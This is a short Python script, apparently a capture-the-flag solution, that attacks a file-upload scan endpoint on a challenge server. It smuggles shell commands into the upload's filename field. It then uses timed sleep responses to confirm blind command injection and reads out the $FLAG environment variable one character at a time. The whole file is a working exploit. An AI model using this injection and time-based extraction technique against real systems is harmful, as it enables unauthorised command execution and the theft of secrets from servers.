import requests
import string
import time
import sys

URL = "https://7c38e8d7-8053-42dd-8a18-a46abf19fe0b.offsec.m0lecon.it/scan"
SLEEP = 5
THRESHOLD = 4.0

session = requests.Session()
session.get(URL.rsplit("/", 1)[0] + "/", timeout=15)

#The files parameter creates this HTTP body:
# ------WebKitFormBoundary...
#Content-Disposition: form-data; name="specimen"; filename="PAYLOAD"
#Content-Type: text/plain
#
#x
#------WebKitFormBoundary...

#files = {"form_field_name": (filename, file_content, content_type)}

def send(payload, body=b"x"):
    files = {"specimen": (payload, body, "text/plain")}
    t0 = time.time()

    r = session.post(URL, files=files)

    return time.time() - t0, r

def hung(elapsed):
    return elapsed > THRESHOLD


# sanity check
elapsed, _ = send(f";sleep {SLEEP};#")
if not hung(elapsed):
    sys.exit("injection not firing")

# $FLAG visible
elapsed, _ = send(f";[ ${{#FLAG}} -gt 0 ]&&sleep {SLEEP};#")
if not hung(elapsed):
    sys.exit("$FLAG not visible")

# Length
flag_len = None
for n in range(1, 128):
    elapsed, _ = send(f";[ ${{#FLAG}} -eq {n} ]&&sleep {SLEEP};#")
    if hung(elapsed):
        flag_len = n
        print(f"Flag length = {n}")
        break
if flag_len is None:
    sys.exit("length not found")

charset = string.ascii_letters + string.digits + "{}_-.!?@#%+=:,"
flag = ""
for i in range(flag_len):
    for c in charset:
        payload = f";[ x$(echo $FLAG|cut -c{i+1}) = x{c} ]&&sleep {SLEEP};#"
        elapsed, _ = send(payload)
        if hung(elapsed):
            flag += c
            print(f"Found {c}")
            break

print(f"\n[+] FLAG: {flag}")